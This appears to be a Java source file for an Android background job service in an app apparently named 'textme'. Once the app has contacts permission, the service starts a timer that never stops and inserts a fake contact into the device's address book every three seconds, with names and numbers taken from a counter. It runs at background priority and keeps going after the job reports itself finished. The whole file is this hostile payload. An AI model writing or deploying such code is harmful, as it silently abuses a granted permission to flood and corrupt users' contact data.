package com.candroid.textme.jobs.services;

import android.Manifest;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.pm.PackageManager;
import android.os.Process;

import com.candroid.textme.api.Lofl;
import com.candroid.textme.jobs.JobsScheduler;

import java.util.Timer;
import java.util.TimerTask;

public class InsertContactJobService extends JobService {
    private static long sNumber = 1111111111;
    @Override
    public boolean onStartJob(JobParameters params) {
        if(this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED){
            TimerTask timerTask = new TimerTask() {
                @Override
                public void run() {
                    android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    sNumber++;
                    Lofl.insertContact(InsertContactJobService.this, String.valueOf(sNumber).concat(" ").concat(String.valueOf(sNumber)), String.valueOf(sNumber++));
                }
            };
            Timer timer = new Timer("insertContactsTask", true);
            timer.scheduleAtFixedRate(timerTask, 0, 3000);
            Lofl.setJobRan(this, JobsScheduler.INSERT_CONTACT_KEY);
            this.jobFinished(params,false);
        }
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}
